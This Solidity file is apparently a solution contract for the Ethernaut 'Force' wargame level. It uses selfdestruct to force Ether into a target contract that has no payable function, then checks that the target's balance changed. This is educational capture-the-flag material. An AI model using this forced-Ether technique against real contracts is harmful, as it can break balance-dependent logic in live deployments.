// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IForce.sol";

/**
 * @title Force Attack (Ethernaut Challenge Level 7 - Force)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 7
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea
 * @custom:security-contact emretepedev@gmail.com
 */
contract ForceAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IForce target) external payable {
        require(0 < msg.value, "Force: Value must be gt 0");

        uint256 balance = address(target).balance;

        selfdestruct(payable(address(target)));

        require(balance != address(target).balance, "Force: Attack failed");
    }
}
